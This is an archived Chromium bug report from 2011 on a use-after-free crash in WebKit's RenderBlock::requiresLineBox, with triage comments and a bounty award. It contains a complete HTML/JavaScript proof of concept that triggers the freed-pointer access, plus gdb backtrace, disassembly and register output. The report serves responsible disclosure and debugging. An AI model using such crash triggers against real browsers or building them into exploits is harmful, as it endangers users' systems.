# Another stale pointer in WebCore::RenderBlock::requiresLineBox

| Field | Value |
|-------|-------|
| **Issue ID** | [40090851](https://issues.chromium.org/issues/40090851) |
| **Status** | New |
| **Severity** | Unknown |
| **Priority** | P4 |
| **Component** | Unknown |
| **Reporter** | ma...@gmail.com |
| **Assignee** | se...@chromium.org |
| **Created** | 2011-05-11 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

Under certain circumstances, chromium will crash in WebCore::RenderBlock::requiresLineBox. The reproduction case that is included causes a crash that looks almost identical to the ones caused by <https://crbug.com/chromium/70027>.

<http://code.google.com/p/chromium/issues/detail?id=70027>

As was the case before, it->obj seems to be freed and the text on the page has to be large enough to wrap. I have been unable to narrow down the reproduction case any further.

**VERSION**  

Chrome Version: Chromium 11.0.696.57 Ubuntu 11.04 (stable), Google Chrome 12.0.742.30 (dev)  

Operating System: Tested in Ubuntu 11.04 (64-bit) and Ubuntu 10.10 (32-bit)

**REPRODUCTION CASE**

<html>
<head><title>WebCore::RenderBlock::requiresLineBox crash</title></head>
<body onload="boom();">
<script type="text/javascript">
function boom() {
iframe\_1 = document.createElement('iframe');
document.documentElement.appendChild(iframe\_1);
arbitrary = document.createElement('arbitrary');
t\_node = document.createTextNode('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa');
document.documentElement.appendChild(t\_node);
arbitrary.style.float = 'right';
document.documentElement.appendChild(arbitrary);
document.documentElement.offsetTop;
document.documentElement.removeChild(iframe\_1);
document.documentElement.removeChild(arbitrary);
iframe\_2 = document.createElement('iframe');
iframe\_2.style.position = 'absolute';
document.documentElement.appendChild(iframe\_2);
document.documentElement.offsetTop;
document.documentElement.removeChild(iframe\_2);
document.documentElement.appendChild(iframe\_1);
button = iframe\_1.contentDocument.createElement('button');
button.setAttribute('autofocus', 'autofocus');
iframe\_1.contentDocument.documentElement.appendChild(button);
document.documentElement.removeChild(iframe\_1);
}
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

$ chromium-browser --debug --single-process crash.html  

(gdb) r  

Starting program: /usr/lib/chromium-browser/chromium-browser --single-process crash.html

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffd18c2700 (LWP 3783)]  

0x00007ffff68432b3 in WebCore::RenderBlock::requiresLineBox (it=...,  

isLineEmpty=true, previousLineBrokeCleanly=false)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:1296  

1296 third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp: No such file or directory.  

in third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp  

(gdb) bt  

#0 0x00007ffff68432b3 in WebCore::RenderBlock::requiresLineBox (it=...,  

isLineEmpty=true, previousLineBrokeCleanly=false)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:1296  

#1 0x00007ffff6846133 in WebCore::RenderBlock::skipLeadingWhitespace (this=  

0x7ffff8ed56d8, resolver=..., firstLine=false, isLineEmpty=true,  

previousLineBrokeCleanly=false, lastFloatFromPreviousLine=0x0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:1368  

#2 0x00007ffff68462b6 in WebCore::RenderBlock::findNextLineBreak (  

this=0x7ffff8ed56d8, resolver=..., firstLine=false,  

isLineEmpty=@0x7fffd18c0d0a, lineBreakIteratorInfo=...,  

previousLineBrokeCleanly=@0x7fffd18c0d0b, hyphenated=@0x7fffd18c0d09,  

clear=0x7fffd18c0cf4, lastFloatFromPreviousLine=0x0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:1484  

#3 0x00007ffff684e0b7 in WebCore::RenderBlock::layoutInlineChildren (  

this=0x7ffff8ed56d8, relayoutChildren=<value optimized out>,  

repaintLogicalTop=@0x7fffd18c0e2c, repaintLogicalBottom=@0x7fffd18c0e28)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlockLineLayout.cpp:692  

#4 0x00007ffff68416bc in WebCore::RenderBlock::layoutBlock (  

this=0x7ffff8ed56d8, relayoutChildren=false, pageLogicalHeight=0)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1222  

#5 0x00007ffff682611d in WebCore::RenderBlock::layout (this=0x7ffff8ed56d8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:1120  

...

(gdb) disas  

Dump of assembler code for function WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool):  

0x00007ffff6843260 <+0>: mov %rbx,-0x20(%rsp)  

0x00007ffff6843265 <+5>: mov %rbp,-0x18(%rsp)  

0x00007ffff684326a <+10>: mov %rdi,%rbx  

0x00007ffff684326d <+13>: mov %r12,-0x10(%rsp)  

0x00007ffff6843272 <+18>: mov %r13,-0x8(%rsp)  

0x00007ffff6843277 <+23>: sub $0x28,%rsp  

0x00007ffff684327b <+27>: mov 0x8(%rdi),%rdi  

0x00007ffff684327f <+31>: mov %esi,%r12d  

0x00007ffff6843282 <+34>: mov %edx,%ebp  

0x00007ffff6843284 <+36>: movzbl 0x30(%rdi),%eax  

0x00007ffff6843288 <+40>: test $0x20,%al  

0x00007ffff684328a <+42>: jne 0x7ffff6843290 <WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool)+48>  

0x00007ffff684328c <+44>: test $0x40,%al  

0x00007ffff684328e <+46>: je 0x7ffff68432b0 <WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool)+80>  

0x00007ffff6843290 <+48>: xor %ebp,%ebp  

0x00007ffff6843292 <+50>: mov %ebp,%eax  

0x00007ffff6843294 <+52>: mov 0x8(%rsp),%rbx  

0x00007ffff6843299 <+57>: mov 0x10(%rsp),%rbp  

0x00007ffff684329e <+62>: mov 0x18(%rsp),%r12  

0x00007ffff68432a3 <+67>: mov 0x20(%rsp),%r13  

0x00007ffff68432a8 <+72>: add $0x28,%rsp  

0x00007ffff68432ac <+76>: retq  

0x00007ffff68432ad <+77>: nopl (%rax)  

0x00007ffff68432b0 <+80>: mov (%rdi),%rax  

=> 0x00007ffff68432b3 <+83>: callq \*0x168(%rax)  

0x00007ffff68432b9 <+89>: test %al,%al  

0x00007ffff68432bb <+91>: jne 0x7ffff6843350 <WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool)+240>  

0x00007ffff68432c1 <+97>: mov 0x8(%rbx),%rdi  

0x00007ffff68432c5 <+101>: mov 0x8(%rdi),%rax  

0x00007ffff68432c9 <+105>: movzbl 0x54(%rax),%eax  

0x00007ffff68432cd <+109>: and $0x7,%eax

(gdb) i r  

rax 0x0 0  

rbx 0x7fffd18c0a00 140736709003776  

rcx 0x0 0  

rdx 0x0 0  

rsi 0x1 1  

rdi 0x7ffff8ed5618 140737369691672  

rbp 0x0 0x0  

rsp 0x7fffd18c03d0 0x7fffd18c03d0  

r8 0x0 0  

r9 0x0 0  

r10 0x0 0  

r11 0x0 0  

r12 0x1 1  

r13 0x0 0  

r14 0x1 1  

r15 0x0 0  

rip 0x7ffff68432b3 0x7ffff68432b3 <WebCore::RenderBlock::requiresLineBox(WebCore::InlineIterator const&, bool, bool)+83>  

eflags 0x10246 [ PF ZF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0

(gdb) print \*it->obj.m\_style->m\_ptr  

$2 = {<WTF::RefCounted[WebCore::RenderStyle](javascript:void(0);)> = {[WTF::RefCountedBase](javascript:void(0);) = {  

m\_refCount = -114864384}, <No data fields>},  

m\_affectedByAttributeSelectors = true, m\_unique = true,  

m\_affectedByEmpty = true, m\_emptyState = true,  

m\_childrenAffectedByFirstChildRules = true,  

m\_childrenAffectedByLastChildRules = true,  

...

## Attachments

- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 1.4 KB)
- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 16.5 KB)

## Timeline

### in...@chromium.org (2011-05-12)

Thanks Marty. We know about this and it is an issue with how floats work with incremental line layout.

### sc...@gmail.com (2011-06-30)

Looks like Marty's repro was a different variant so we can put it to the panel.

### sc...@gmail.com (2011-07-20)

@MartyBarbella: filed a dup? Never fear! In this instance, the rewards panel decided that this aspect of the older bug might have been missed, were it not for your report. Hence, we're delighted to offer a $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-08-04)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/82354?no_tracker_redirect=1

[Monorail mergedinto: crbug.com/chromium/78841]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090851)*
